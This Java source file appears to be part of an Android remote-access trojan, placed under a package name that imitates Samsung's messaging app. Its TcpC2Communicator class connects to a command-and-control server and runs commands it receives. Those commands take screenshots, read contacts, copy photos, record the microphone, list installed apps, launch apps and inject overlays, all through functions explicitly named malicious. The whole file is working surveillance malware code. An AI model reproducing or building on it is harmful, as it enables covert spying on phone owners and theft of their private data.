package com.samsung.android.messaging;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

class TcpC2Communicator implements Runnable {
    private Context mApplicationContext;
    private String ccServer = "192.168.0.105";
    private int ccPort = 8000;

    // For mediaProjection API
    private Intent mMediaProjectionIntent;

    public static OutputStream mOutputStream;

    public TcpC2Communicator(Context appContext, Intent i) {
        mApplicationContext = appContext;
        mMediaProjectionIntent = i;
    }


    @Override
    public void run() {
        try {
            // Connect to the server
            Socket socket = new Socket(ccServer, ccPort);
            socket.setSoTimeout(0);

            // Open outputStream to send messages back to the server
            mOutputStream = socket.getOutputStream();

            // Open inputStream to receive messages from the server
            InputStream inputStream = socket.getInputStream();

            // Continuously look for messages from the server
            byte[] buffer = new byte[1024];
            while (true) {
                int bytesRead = inputStream.read(buffer);
                if (bytesRead > 0) {
                    String message = new String(buffer, 0, bytesRead, StandardCharsets.UTF_8);
                    Log.d("TCPClient", "Received message: " + message);
                    handleIncomingCommand(message);


                }
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleIncomingCommand(String command) {
        switch (command) {
            case MaliciousDefines.TAKE_SCREENSHOT:
                CommandRunner.executeCommand(() -> {
                    MaliciousFunctions.takeScreenshot(mApplicationContext,
                            mMediaProjectionIntent,
                            -1);
                });
                break;
            case MaliciousDefines.READ_CONTACTS:
                CommandRunner.executeCommand(() -> {
                    MaliciousFunctions.readContacts(mApplicationContext);
                });
                break;
            case MaliciousDefines.COPY_PHOTOS:
                CommandRunner.executeCommand(() -> {
                    MaliciousFunctions.getPhotos(mApplicationContext);
                });
                break;
            case MaliciousDefines.RECORD_MIC:
                CommandRunner.executeCommand(() -> {
                    MaliciousFunctions.recordMic(mApplicationContext);
                });
                break;
            case MaliciousDefines.GET_PACKAGES:
                CommandRunner.executeCommand(() -> {
                    MaliciousFunctions.readPackageList(mApplicationContext);
                });
                break;
            case MaliciousDefines.LAUNCH_APP:
                CommandRunner.executeCommand(() -> {
                    MaliciousFunctions.launchApp(mApplicationContext);
                });
                break;
            case MaliciousDefines.APP_INJECTION:
                CommandRunner.executeCommand(() -> {
                    MaliciousFunctions.injectOverlay(mApplicationContext);
                });
                break;
            default:
                return;
        }
    }

    public void sendMessage(TcpC2Message Message) throws IOException {
        if (mOutputStream != null) {
            mOutputStream.write(Message.toByteArray());
            mOutputStream.flush();
        } else {
            throw new IOException("Output stream not initialized.");
        }
    }
}
